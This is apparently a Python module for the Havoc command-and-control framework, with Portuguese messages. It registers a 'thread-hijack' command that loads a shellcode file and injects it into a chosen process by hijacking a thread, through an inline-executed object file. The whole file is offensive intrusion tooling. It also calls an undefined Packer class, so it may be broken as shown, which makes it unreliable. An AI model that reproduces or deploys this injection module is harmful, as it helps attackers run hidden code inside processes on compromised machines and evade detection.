from havoc import Demon, RegisterCommand, RegisterModule
from struct import pack

def thread_hijack(demonID, *param):
    TaskID = None
    demon = Demon(demonID)
    
    if len(param) < 2:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Uso: thread-hijack [PID] [Shellcode Path]")
        return False

    try:
        processID = int(param[0])
    except ValueError:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "O PID precisa ser um número válido")
        return False

    shellcodePath = param[1]
    
    try:
        with open(shellcodePath, "rb") as f:
            shellcode = f.read()
    except FileNotFoundError:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Arquivo não encontrado: {shellcodePath}")
        return False

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Injetando shellcode no processo {processID} via Thread Hijacking")
    
    packer = Packer()
    packer.addint(processID)
    packer.addstr(shellcode)
    
    demon.InlineExecute(TaskID, "go", f"thread_hijack.{demon.ProcessArch}.o", packer.getbuffer(), False)
    
    return TaskID

RegisterModule(
    "thread-hijack",
    "Inject shellcode via Thread Hijacking",
    "",
    "[PID] [Shellcode Path]",
    "",
    ""
)

RegisterCommand(
    thread_hijack,
    "thread-hijack",
    "inject",
    "Injects shellcode into a process via Thread Hijacking",
    0,
    "[PID] [Shellcode Path]",
    "1234 /tmp/shellcode.bin"
)
